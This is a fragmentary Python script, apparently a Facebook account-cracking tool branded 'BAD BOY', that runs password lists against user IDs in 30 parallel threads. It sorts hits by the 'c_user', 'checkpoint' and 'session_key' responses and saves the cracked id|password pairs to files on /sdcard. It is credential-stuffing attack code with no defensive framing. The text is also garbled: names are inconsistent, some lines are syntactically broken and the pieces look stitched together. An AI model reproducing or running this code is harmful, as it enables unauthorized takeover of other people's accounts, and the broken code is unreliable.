...
def pak():
                ...
                with tred(max_workers=30) as SWAJON:     
                        ...
                        for psx in user:
                                ...
                                BAD BOY.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SWAJON:
                                ...
                                print('\r\r\033[1;32m[BAD BOY-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SWAJON-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in BAD BOY
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[SWAJON-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BAD BOY -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;32m[★彡BAD BOY 𝙲𝚁𝙰𝙺𝙸𝙽𝙶彡★] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print('\x1b[1;92m[BAD BOY -OK] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/BAD BOY -OK.txt', 'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BAD BOY -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m[BAD BOY -OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/BAD BOY -OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m[BAD BOY -OK] '+uid+' | '+pas+'\033[1;97m')
